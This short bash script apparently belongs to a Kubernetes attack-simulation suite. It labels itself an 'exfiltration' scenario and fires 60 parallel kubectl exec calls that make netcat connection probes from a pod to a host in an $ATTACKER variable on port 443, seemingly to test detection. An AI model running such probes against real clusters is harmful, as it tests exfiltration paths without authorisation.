#!/usr/bin/env bash
ATTACK=exfiltration_nosh; . "$(dirname "$0")/_lib.sh"
echo "[attack:$ATTACK] pod=$POD t=$(date +%s)"
seq 60 | xargs -P 20 -I{} kubectl -n "$NS" exec "$POD" -- nc -z -w1 "$ATTACKER" 443 || true
